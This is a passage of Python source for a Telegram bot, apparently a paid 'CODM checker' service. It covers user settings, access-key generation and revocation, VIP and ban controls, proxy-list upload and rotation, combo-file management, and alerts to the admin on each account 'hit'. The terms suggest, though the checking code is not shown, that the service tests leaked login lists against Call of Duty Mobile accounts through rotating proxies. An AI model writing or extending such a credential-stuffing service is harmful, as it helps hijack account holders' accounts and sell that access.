            f"{pe(1)} Level  : {LEVEL_OPTIONS[key]['label']}\n"
            f"{pe(1)} Filter : {CLEAN_OPTIONS[ck]['label']}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Tap <b>{BTN_START_NOW}</b> to begin!",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_settings(uid)); return

    if text in CF_BTN_MAP:
        key = CF_BTN_MAP[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["cf_key"] = key
        lk=active_sessions.get(uid,{}).get("lvl_key","lvl_all"); ck=key
        await update.message.reply_text(
            f"{pe(2)} <b>Clean Filter Set</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Level  : {LEVEL_OPTIONS[lk]['label']}\n"
            f"{pe(1)} Filter : {CLEAN_OPTIONS[key]['label']}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Tap <b>{BTN_START_NOW}</b> to begin!",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_settings(uid)); return

    if text == BTN_BACK:
        # Return to settings screen
        with sessions_lock: s=active_sessions.get(uid,{})
        st=s.get("status","")
        if st in ("waiting_file","file_received","settings"):
            await update.message.reply_text(
                f"{pe(2)} <b>Settings</b>\n{pe_sep()}\n{pe(1)} Choose level and filter, then start!",
                parse_mode=ParseMode.HTML, reply_markup=kb_settings(uid)); return
        # Otherwise go home
        await cmd_start(update, context); return

    if text == BTN_CANCEL:
        await _do_stop(update, context); return

    if text == BTN_CONTINUE:
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2 and s2.get("status")=="checking":
            with sessions_lock: active_sessions[uid]["stop_continue"]=True
            s2.get("stop_event",threading.Event()).set()
            await update.message.reply_text(
                f"{pe(5)} <b>Continuing!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Partial results sent now, checking continues! {pe(2)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} /check for live stats {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user())
        else:
            await update.message.reply_text(f"{pe(1)} No active session.", parse_mode=ParseMode.HTML)
        return

    if text == BTN_STOP_GET:
        with sessions_lock: s2=active_sessions.get(uid,{})
        if s2 and s2.get("status")=="checking":
            with sessions_lock: active_sessions[uid]["stop_continue"]=False
            s2.get("stop_event",threading.Event()).set()
            clear_persisted_session(uid)
            await update.message.reply_text(
                f"{pe(5)} <b>Stop Signal Sent!</b> {pe(5)}\n"
                f"{pe_sep()}\n"
                f"{pe(2)} Results will be zipped and sent shortly. {pe(2)}",
                parse_mode=ParseMode.HTML, reply_markup=kb_main_admin() if is_admin(tg.id,cfg) else kb_main_user())
        else:
            await update.message.reply_text(f"{pe(1)} No active session.", parse_mode=ParseMode.HTML)
        return

    # ── ADMIN buttons ─────────────────────────────────────────────────────
    if not is_admin(tg.id,cfg):
        return  # non-admin, non-routing text — ignore silently

    if text == BTN_ADM_BACK:
        await _show_admin_panel(update.message, cfg); return

    if text in (BTN_ADM_LOCK, BTN_ADM_UNLOCK):
        cfg2=load_config(); cfg2["locked"]=not cfg2.get("locked",False); save_config(cfg2)
        users2=load_users()
        if cfg2["locked"]:
            with sessions_lock:
                for uid2,s2 in active_sessions.items():
                    if s2.get("status")=="checking" and not users2.get(uid2,{}).get("vip"):
                        s2["stop_event"].set()
        status="LOCKED" if cfg2["locked"] else "UNLOCKED"
        await update.message.reply_text(
            f"{pe(2)} <b>Bot {status}</b>\n{pe_sep()}\nDone.",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_REFRESH:
        cfg2=load_config()
        saved_mc=cfg2.get("max_concurrent",5)
        if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
        try:
            geo_rotator.__init__()
        except: pass
        await update.message.reply_text(
            f"{pe(3)} <b>Refreshed!</b>\n{pe_sep()}\nConfig and proxy rotator reloaded.",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_KEYS:
        cfg2=load_config(); keys2=load_keys()
        await update.message.reply_text(
            f"{pe(2)} <b>Keys Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total Keys : <code>{len(keys2)}</code>\n"
            f"{pe(1)} Used Keys  : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    if text in (BTN_ADM_GEN_HOURS, BTN_ADM_GEN_DAYS, BTN_ADM_GEN_MONTHS, BTN_ADM_GEN_LIFE):
        dtype_map={BTN_ADM_GEN_HOURS:"hours",BTN_ADM_GEN_DAYS:"days",BTN_ADM_GEN_MONTHS:"months",BTN_ADM_GEN_LIFE:"lifetime"}
        dtype=dtype_map[text]
        with sessions_lock:
            active_sessions.setdefault(uid,{})["awaiting_admin_input"]=f"genkey_{dtype}"
        hints={"hours":"e.g. 24  (for 24 hours)","days":"e.g. 7  (for 7 days)","months":"e.g. 1  (for 1 month)","lifetime":"Type max_users only  e.g. 1"}
        if dtype=="lifetime":
            await update.message.reply_text(
                f"{pe(2)} <b>Generate Lifetime Key</b>\n"
                f"{pe_sep()}\n"
                f"Send: <code>max_users</code>\n"
                f"Example: <code>1</code>",
                parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return
        await update.message.reply_text(
            f"{pe(2)} <b>Generate {dtype.title()} Key</b>\n"
            f"{pe_sep()}\n"
            f"Send: <code>value max_users</code>\n"
            f"Example: <code>{hints[dtype]}</code>  then max users, e.g. <code>24 1</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text in (BTN_ADM_RM_ALL_K, BTN_ADM_RM_VIP_K, BTN_ADM_RM_NVIP_K):
        mode_map={BTN_ADM_RM_ALL_K:"all",BTN_ADM_RM_VIP_K:"vip",BTN_ADM_RM_NVIP_K:"nonvip"}
        mode=mode_map[text]
        users3=load_users(); cnt3=0
        for uid3 in list(users3.keys()):
            u3=users3[uid3]; iv3=u3.get("vip",False); ia3=u3.get("activated",False)
            match3=(mode=="all" and ia3) or (mode=="vip" and ia3 and iv3) or (mode=="nonvip" and ia3 and not iv3)
            if match3:
                users3[uid3].update({"activated":False,"key_used":None,"key_expires_at":None,"key_expired":False}); cnt3+=1
                with sessions_lock:
                    if uid3 in active_sessions: active_sessions[uid3].get("stop_event",threading.Event()).set()
                try: await context.bot.send_message(chat_id=int(uid3),text=f"{pe(2)} <b>Access Revoked</b>\n{pe_sep()}\nYour key was removed by admin.",parse_mode=ParseMode.HTML)
                except: pass
        save_users(users3)
        label3={"all":"All","vip":"VIP","nonvip":"Non-VIP"}[mode]
        await update.message.reply_text(
            f"{pe(3)} <b>Keys Removed ({label3})</b>\n"
            f"{pe_sep()}\n{pe(1)} Revoked: <code>{cnt3}</code> user(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_keys()); return

    if text == BTN_ADM_USERS:
        users2=load_users()
        ac=sum(1 for u in users2.values() if u.get("activated"))
        bc=sum(1 for u in users2.values() if u.get("banned"))
        vc=sum(1 for u in users2.values() if u.get("vip"))
        await update.message.reply_text(
            f"{pe(2)} <b>Users Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total    : <code>{len(users2)}</code>\n"
            f"{pe(1)} Active   : <code>{ac}</code>\n"
            f"{pe(1)} Banned   : <code>{bc}</code>\n"
            f"{pe(1)} VIP      : <code>{vc}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_users()); return

    if text in (BTN_ADM_ADDVIP, BTN_ADM_RMVIP, BTN_ADM_BAN, BTN_ADM_UNBAN, BTN_ADM_BROADCAST):
        action_map={BTN_ADM_ADDVIP:"addvip",BTN_ADM_RMVIP:"rmvip",BTN_ADM_BAN:"ban",BTN_ADM_UNBAN:"unban",BTN_ADM_BROADCAST:"broadcast"}
        action=action_map[text]
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]=action
        prompts={"addvip":"Send user ID to add VIP:","rmvip":"Send user ID to remove VIP:","ban":"Send user ID to ban:","unban":"Send user ID to unban:","broadcast":"Send broadcast message text:"}
        await update.message.reply_text(
            f"{pe(2)} <b>{text}</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} {prompts[action]}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_ALLUSERS:
        users3=load_users()
        ac3=sum(1 for u in users3.values() if u.get("activated"))
        bc3=sum(1 for u in users3.values() if u.get("banned"))
        vc3=sum(1 for u in users3.values() if u.get("vip"))
        lines3=[f"{pe(2)} <b>Users ({len(users3)})</b>  Active:{ac3}  Banned:{bc3}  VIP:{vc3}\n{pe_sep()}"]
        for uid3,u3 in sorted(users3.items(),key=lambda x:x[1].get("joined",""),reverse=True):
            st3="BANNED" if u3.get("banned") else ("VIP" if u3.get("vip") else ("Active" if u3.get("activated") else "Pending"))
            lines3.append(f"[{st3}] <code>{uid3}</code> @{u3.get('username','?')}  {u3.get('total_checked',0):,} checked")
        msg3="\n".join(lines3)
        for chunk in [msg3[i:i+4000] for i in range(0,len(msg3),4000)]:
            await context.bot.send_message(chat_id=update.effective_chat.id,text=chunk,parse_mode=ParseMode.HTML)
        return

    if text == BTN_ADM_RUNNING:
        with sessions_lock:
            running=[(u2,dict(s)) for u2,s in active_sessions.items() if s.get("status")=="checking"]
        users2=load_users()
        if not running:
            await update.message.reply_text(f"{pe(2)} <b>No Active Sessions</b>\n{pe_sep()}\nNo one is checking right now.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_main(cfg)); return
        lines2=[f"{pe(3)} <b>Running ({len(running)})</b>\n{pe_sep()}"]
        for u2,s2 in running:
            ud2=users2.get(u2,{}); fn2=ud2.get("first_name","?"); un2=ud2.get("username","?")
            ls3=s2.get("live_stats"); st3=ls3.get_stats() if ls3 else {}
            orig2=s2.get("orig_total",0)
            done2=st3.get("total",0); pct2=int(done2/orig2*100) if orig2 else 0
            lines2.append(f"\n{pe(1)} <b>{fn2}</b> @{un2}\n{pe(1)} Progress: {done2}/{orig2} ({pct2}%)  CODM: {st3.get('has_codm',0)}")
        await update.message.reply_text("\n".join(lines2),parse_mode=ParseMode.HTML,reply_markup=kb_admin_main(cfg)); return

    if text == BTN_ADM_STATS:
        cfg2=load_config(); users2=load_users(); keys2=load_keys()
        tu=len(users2); au=sum(1 for u in users2.values() if u.get("activated"))
        bu=sum(1 for u in users2.values() if u.get("banned"))
        vu=sum(1 for u in users2.values() if u.get("vip"))
        tc=sum(u.get("total_checked",0) for u in users2.values())
        with sessions_lock: live2=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        pf2=list(PROXY_DIR.glob("*.txt")); tp2=0
        for pf3 in pf2:
            try:
                with open(pf3,"r",encoding="utf-8",errors="ignore") as fh:
                    tp2+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
            except: pass
        await update.message.reply_text(
            f"{pe(3)} <b>Statistics</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Total Users   : <code>{tu}</code>\n"
            f"{pe(1)} Activated     : <code>{au}</code>\n"
            f"{pe(1)} Banned        : <code>{bu}</code>\n"
            f"{pe(1)} VIP           : <code>{vu}</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Running       : <code>{live2}/{MAX_CONCURRENT_CHECKERS}</code>\n"
            f"{pe(1)} Total Checked : <code>{tc:,}</code>\n"
            f"{pe(1)} Keys Total    : <code>{len(keys2)}</code>\n"
            f"{pe(1)} Keys Used     : <code>{sum(1 for k in keys2.values() if k.get('used_by'))}</code>\n"
            f"{pe(1)} Proxies       : <code>{tp2:,}</code> in <code>{len(pf2)}</code> file(s)\n"
            f"{pe(1)} Locked        : <code>{'YES' if cfg2.get('locked') else 'No'}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_main(cfg2)); return

    if text == BTN_ADM_PROXY:
        pf4=sorted(PROXY_DIR.glob("*.txt")); tp4=0
        for pf5 in pf4:
            try:
                with open(pf5,"r",encoding="utf-8",errors="ignore") as fh:
                    tp4+=sum(1 for ln in fh if ln.strip() and not ln.strip().startswith("#"))
            except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Proxy Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Files   : <code>{len(pf4)}</code>\n"
            f"{pe(1)} Proxies : <code>{tp4:,}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy()); return

    if text == BTN_ADM_UPL_PROXY:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_proxy"]=True
        await update.message.reply_text(
            f"{pe(2)} <b>Upload Proxy File</b>\n"
            f"{pe_sep()}\n"
            f"Send your <code>.txt</code> proxy file now.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_PASTE_PRX:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_proxy_paste"]=True
        await update.message.reply_text(
            f"{pe(2)} <b>Paste Proxies</b>\n"
            f"{pe_sep()}\n"
            f"Paste proxy lines now (one per line).\n<code>host:port</code> or <code>host:port:user:pass</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_PROXY_STAT:
        pf6=sorted(PROXY_DIR.glob("*.txt"))
        if not pf6:
            await update.message.reply_text(f"{pe(1)} No proxy files.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        lines6=[f"{pe(2)} <b>Proxy Files</b>\n{pe_sep()}"]
        tot6=0
        for p6 in pf6:
            try:
                with open(p6,"r",encoding="utf-8",errors="ignore") as f6:
                    cnt6=sum(1 for ln in f6 if ln.strip() and not ln.strip().startswith("#"))
                sz6=p6.stat().st_size; ss6=f"{sz6/1024:.1f}KB" if sz6<1024*1024 else f"{sz6/1024/1024:.1f}MB"
                tot6+=cnt6; lines6.append(f"{pe(1)} <code>{p6.name}</code>  {cnt6:,}  {ss6}")
            except: lines6.append(f"{pe(1)} <code>{p6.name}</code>  error")
        lines6.append(f"{pe_sep()}\nTotal: <code>{tot6:,}</code>")
        await update.message.reply_text("\n".join(lines6),parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return

    if text == BTN_ADM_RM_PROXY:
        pf7=sorted(PROXY_DIR.glob("*.txt"))
        if not pf7:
            await update.message.reply_text(f"{pe(1)} No proxy files.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy()); return
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="del_proxy_select"
        fnames="\n".join(f"  <code>{p.name}</code>" for p in pf7)
        await update.message.reply_text(
            f"{pe(2)} <b>Remove Proxy File</b>\n{pe_sep()}\nSend the filename to delete (or <code>ALL</code>):\n{fnames}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_RELOAD_PRX:
        try:
            geo_rotator.__init__()
            total_p=geo_rotator.total if hasattr(geo_rotator,"total") else "?"
            await update.message.reply_text(
                f"{pe(3)} <b>Proxy Reloaded!</b>\n{pe_sep()}\n{pe(1)} Total proxies: <code>{total_p}</code>",
                parse_mode=ParseMode.HTML, reply_markup=kb_admin_proxy())
        except Exception as e:
            await update.message.reply_text(f"{pe(1)} Reload failed: <code>{e}</code>",parse_mode=ParseMode.HTML,reply_markup=kb_admin_proxy())
        return

    if text == BTN_ADM_SETTINGS:
        cfg5=load_config()
        ml5=cfg5.get('max_lines_per_check'); cd5=cfg5.get('cooldown_sessions')
        cd5_s=f"{cd5}sess→{cfg5.get('cooldown_minutes',30)}m" if cd5 else "Off"
        maint5="🔴 ON" if cfg5.get("maintenance_mode") else "🟢 Off"
        await update.message.reply_text(
            f"{pe(5)} <b>Settings Panel</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Threads       : <code>{cfg5.get('default_threads',5)}</code>\n"
            f"{pe(1)} Concurrent    : <code>{cfg5.get('max_concurrent',5)}</code>\n"
            f"{pe(1)} Limit         : <code>{cfg5.get('global_limit') or 'Unlimited'}</code>\n"
            f"{pe(1)} VIP Limit     : <code>{cfg5.get('vip_limit') or 'Unlimited'}</code>\n"
            f"{pe(2)} Max/Session   : <code>{ml5 or 'Unlimited'}</code> {pe(2)}\n"
            f"{pe(1)} Cooldown      : <code>{cd5_s}</code>\n"
            f"{pe(1)} Locked        : <code>{'YES 🔒' if cfg5.get('locked') else 'No 🔓'}</code>\n"
            f"{pe(1)} Maintenance   : <code>{maint5}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_settings(cfg5)); return

    if text == BTN_ADM_MLIMIT:
        cfg5=load_config()
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="setmlimit"
        await update.message.reply_text(
            f"{pe(2)} <b>Max Lines Per Check</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current: <code>{cfg5.get('max_lines_per_check') or 'Unlimited'}</code>\n"
            f"{pe_sep()}\n"
            f"Send a number (e.g. <code>5000</code>) to set the max lines per session,\n"
            f"or <code>off</code> to remove the limit.\n\n"
            f"{pe(1)} This caps every user's session regardless of their personal limit.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_DEN:
        cfg5=load_config()
        maint5="🔴 ACTIVE" if cfg5.get("maintenance_mode") else "🟢 Inactive"
        ann5=cfg5.get("announcement_text","").strip()
        ann5_s=f"Set ✅" if ann5 else "None"
        uptime_s5=int(time.time()-_railway_start); h5,m5=uptime_s5//3600,(uptime_s5%3600)//60
        await update.message.reply_text(
            f"{pe(5)} <b>⚡ Admin Den</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Maintenance  : <b>{maint5}</b> {pe(2)}\n"
            f"{pe(1)} Announcement : <code>{ann5_s}</code>\n"
            f"{pe(1)} Bot uptime   : <code>{h5}h {m5}m</code>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Advanced admin controls below:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_ANNOUNCE:
        cfg5=load_config()
        ann5=cfg5.get("announcement_text","").strip()
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="set_announcement"
        await update.message.reply_text(
            f"{pe(2)} <b>Announcement</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Current: <i>{ann5 or 'None'}</i>\n"
            f"{pe_sep()}\n"
            f"Send your announcement text (shown to users on /start).\n"
            f"Send <code>off</code> to clear.",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_MAINT:
        cfg5=load_config()
        cfg5["maintenance_mode"] = not cfg5.get("maintenance_mode", False)
        save_config(cfg5)
        status5="🔴 ENABLED" if cfg5["maintenance_mode"] else "🟢 DISABLED"
        await update.message.reply_text(
            f"{pe(5)} <b>Maintenance Mode {status5}</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Message: <i>{cfg5.get('maintenance_message','')}</i>\n"
            f"{pe_sep()}\n"
            f"{pe(2)} Non-admin users {'blocked' if cfg5['maintenance_mode'] else 'can access normally'}. {pe(2)}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_TOPUSERS:
        users5=load_users()
        sorted_u=sorted(users5.items(), key=lambda x: x[1].get("total_checked",0), reverse=True)[:10]
        lines5=[f"{pe(5)} <b>🏆 Top 10 Checkers</b> {pe(5)}\n{pe_sep()}"]
        medals=["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
        for i,(uid5,ud5) in enumerate(sorted_u):
            fn5=ud5.get("first_name","?"); un5=ud5.get("username","")
            tc5=ud5.get("total_checked",0); vt5=" VIP" if ud5.get("vip") else ""
            lines5.append(f"{medals[i]} <b>{fn5}</b>{' @'+un5 if un5 else ''}{vt5}\n    Checked: <code>{tc5:,}</code>  Sessions: <code>{ud5.get('sessions_count',0)}</code>")
        await update.message.reply_text("\n".join(lines5), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_SYSINFO:
        import platform
        mb5=_get_rss_mb()
        uptime_s5=int(time.time()-_railway_start); h5,m5,s5=uptime_s5//3600,(uptime_s5%3600)//60,uptime_s5%60
        try:
            with open("/proc/loadavg","r") as f5: la5=f5.read().split()[:3]; load5=f"1m:{la5[0]} 5m:{la5[1]} 15m:{la5[2]}"
        except: load5="N/A"
        try:
            with open("/proc/meminfo","r") as f5:
                mi5={l.split(":")[0]:int(l.split()[1]) for l in f5 if ":" in l and l.split()[1].isdigit()}
            total_mb5=mi5.get("MemTotal",0)//1024; free_mb5=mi5.get("MemAvailable",0)//1024
            mem_str=f"{total_mb5-free_mb5}MB/{total_mb5}MB ({int((total_mb5-free_mb5)/total_mb5*100)}%)" if total_mb5 else "N/A"
        except: mem_str=f"RSS:{mb5:.0f}MB"
        with sessions_lock: live5=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        await update.message.reply_text(
            f"{pe(5)} <b>🖥 System Info</b> {pe(5)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Process RAM : <code>{mb5:.1f}MB</code> ({_MEM_LIMIT_MB}MB limit)\n"
            f"{pe(1)} System RAM  : <code>{mem_str}</code>\n"
            f"{pe(1)} CPU Load    : <code>{load5}</code>\n"
            f"{pe(1)} Uptime      : <code>{h5}h {m5}m {s5}s</code>\n"
            f"{pe(1)} Python      : <code>{platform.python_version()}</code>\n"
            f"{pe(1)} Active      : <code>{live5}</code> checkers\n"
            f"{pe(1)} Queue       : <code>{len(_checker_queue)}</code> waiting\n"
            f"{pe(1)} PID         : <code>{os.getpid()}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_NOTIFHIT:
        cfg5=load_config()
        cfg5["notify_admin_on_hit"] = not cfg5.get("notify_admin_on_hit", False)
        save_config(cfg5)
        status5="🔔 ON" if cfg5["notify_admin_on_hit"] else "🔕 OFF"
        await update.message.reply_text(
            f"{pe(3)} <b>Admin Hit Notifications: {status5}</b> {pe(3)}\n"
            f"{pe_sep()}\n"
            f"{pe(1)} {'Admin will receive a message for every CODM hit.' if cfg5['notify_admin_on_hit'] else 'Hit notifications to admin are now off.'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_USERSEARCH:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="usersearch"
        await update.message.reply_text(
            f"{pe(2)} <b>🔍 Search User</b>\n"
            f"{pe_sep()}\n"
            f"Send user ID or @username to look up:",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_KEYLIST:
        keys5=load_keys()
        if not keys5:
            await update.message.reply_text(f"{pe(1)} No keys.", parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return
        lines5=[f"{pe(5)} <b>📋 Key List</b> {pe(5)}\n{pe_sep()}"]
        for k5,kd5 in list(keys5.items())[:20]:
            used5=len(kd5.get("used_by",[])); max5=kd5.get("max_users",1)
            exp5=fmt_expiry(kd5.get("expires_at")); dt5=kd5.get("duration_type","?")
            lines5.append(f"{pe(1)} <code>{k5}</code>\n  {used5}/{max5} users  ·  {dt5}  ·  {exp5}")
        if len(keys5)>20: lines5.append(f"\n{pe(1)} <i>…and {len(keys5)-20} more</i>")
        await update.message.reply_text("\n".join(lines5), parse_mode=ParseMode.HTML, reply_markup=kb_admin_den()); return

    if text == BTN_ADM_BATCHKEY:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="batchkey"
        await update.message.reply_text(
            f"{pe(2)} <b>🔑 Batch Key Generation</b>\n"
            f"{pe_sep()}\n"
            f"Format: <code>type duration count max_users</code>\n\n"
            f"Examples:\n"
            f"  <code>days 30 5 1</code>  → 5 keys, 30 days, 1 user each\n"
            f"  <code>hours 24 10 2</code> → 10 keys, 24h, 2 users each\n"
            f"  <code>lifetime 0 3 1</code> → 3 lifetime keys",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_USERNOTE:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="usernote"
        await update.message.reply_text(
            f"{pe(2)} <b>📝 User Note</b>\n"
            f"{pe_sep()}\n"
            f"Format: <code>user_id your note here</code>\n\n"
            f"Example: <code>123456789 VIP customer, handle with care</code>",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text in (BTN_ADM_SET_LIMIT, BTN_ADM_SET_VLIMIT, BTN_ADM_SET_CD, BTN_ADM_SET_THR, BTN_ADM_SET_CONC):
        action_map2={BTN_ADM_SET_LIMIT:"setlimit",BTN_ADM_SET_VLIMIT:"setviplimit",BTN_ADM_SET_CD:"setcd",BTN_ADM_SET_THR:"setthreads",BTN_ADM_SET_CONC:"setconcurrent"}
        a2=action_map2[text]
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]=a2
        hints2={"setlimit":"Send a number (e.g. 5000) or <code>off</code>","setviplimit":"Send a number or <code>off</code>","setcd":"Send: <code>sessions minutes</code>  e.g. <code>3 30</code>  or <code>off</code>","setthreads":"Send thread count (e.g. 3)","setconcurrent":"Send concurrent slot count (e.g. 5)"}
        await update.message.reply_text(
            f"{pe(2)} <b>{text}</b>\n{pe_sep()}\n{pe(1)} {hints2[a2]}",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return

    if text == BTN_ADM_RELOAD_CFG:
        cfg2=load_config()
        saved_mc=cfg2.get("max_concurrent",5)
        if saved_mc!=MAX_CONCURRENT_CHECKERS: rebuild_semaphore(saved_mc)
        try:
            geo_rotator.__init__()
        except: pass
        await update.message.reply_text(f"{pe(3)} <b>Config Reloaded!</b>\n{pe_sep()}\nSettings refreshed.",parse_mode=ParseMode.HTML,reply_markup=kb_admin_settings(cfg2)); return

    if text == BTN_ADM_FILES:
        cc=sum(1 for d in COMBO_DIR.iterdir() if d.is_dir() for _ in d.glob("*.txt")) if COMBO_DIR.exists() else 0
        cr=sum(1 for d in RESULTS_DIR.iterdir() if d.is_dir()) if RESULTS_DIR.exists() else 0
        await update.message.reply_text(
            f"{pe(2)} <b>Files Panel</b>\n"
            f"{pe_sep()}\n"
            f"{pe(1)} Combo Files   : <code>{cc}</code>\n"
            f"{pe(1)} Result Folders: <code>{cr}</code>\n"
            f"{pe_sep()}\n{pe(1)} Choose action:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_CLR_COMBO:
        count8=0
        for uid_dir8 in list(COMBO_DIR.iterdir()) if COMBO_DIR.exists() else []:
            if uid_dir8.is_dir():
                for f8 in uid_dir8.glob("*.txt"):
                    try: f8.unlink(); count8+=1
                    except: pass
                uid8=uid_dir8.name; clear_persisted_session(uid8)
                with sessions_lock:
                    if uid8 in active_sessions and active_sessions[uid8].get("status") not in ("checking",):
                        del active_sessions[uid8]
                try:
                    if uid_dir8.exists() and not any(uid_dir8.iterdir()): uid_dir8.rmdir()
                except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Combo Cleared</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{count8}</code> file(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_CLR_RES:
        import shutil; dirs8=0
        for uid_dir8 in RESULTS_DIR.iterdir() if RESULTS_DIR.exists() else []:
            if uid_dir8.is_dir():
                try: shutil.rmtree(uid_dir8); dirs8+=1
                except: pass
        await update.message.reply_text(
            f"{pe(2)} <b>Results Cleared</b>\n{pe_sep()}\n{pe(1)} Deleted: <code>{dirs8}</code> folder(s)",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin_files()); return

    if text == BTN_ADM_BROADCAST:
        with sessions_lock: active_sessions.setdefault(uid,{})["awaiting_admin_input"]="broadcast"
        await update.message.reply_text(
            f"{pe(2)} <b>Broadcast</b>\n{pe_sep()}\nSend the message to broadcast to all users:",
            parse_mode=ParseMode.HTML, reply_markup=rkb([BTN_CANCEL])); return


async def _show_admin_panel(msg, cfg):
    """Send admin panel status + keyboard."""
    users=load_users()
    ac=sum(1 for u in users.values() if u.get("activated"))
    bc=sum(1 for u in users.values() if u.get("banned"))
    vc=sum(1 for u in users.values() if u.get("vip"))
    with sessions_lock:
        live=sum(1 for s in active_sessions.values() if s.get("status")=="checking")
        queue5=len(_checker_queue)
    lock_s="🔒 LOCKED" if cfg.get("locked") else "🔓 Unlocked"
    maint_s="🔴 ON" if cfg.get("maintenance_mode") else "🟢 Off"
    ml5=cfg.get("max_lines_per_check")
    ann5="✅ Set" if cfg.get("announcement_text","").strip() else "None"
    uptime_s5=int(time.time()-_railway_start); h5,m5=uptime_s5//3600,(uptime_s5%3600)//60
    bot_name5=cfg.get("bot_name","MITZ Codm Checker Bot")
    await msg.reply_text(
        f"{pe(5)} <b>Admin Panel — {bot_name5}</b> {pe(5)}\n"
        f"{pe_sep()}\n"
        f"{pe(2)} Users      : <code>{len(users)}</code>  ✅{ac}  🚫{bc}  ⭐{vc} {pe(2)}\n"
        f"{pe(2)} Live       : <code>{live}/{MAX_CONCURRENT_CHECKERS}</code>  Queue: <code>{queue5}</code> {pe(2)}\n"
        f"{pe(1)} Lock       : {lock_s}\n"
        f"{pe(1)} Maintenance: {maint_s}\n"
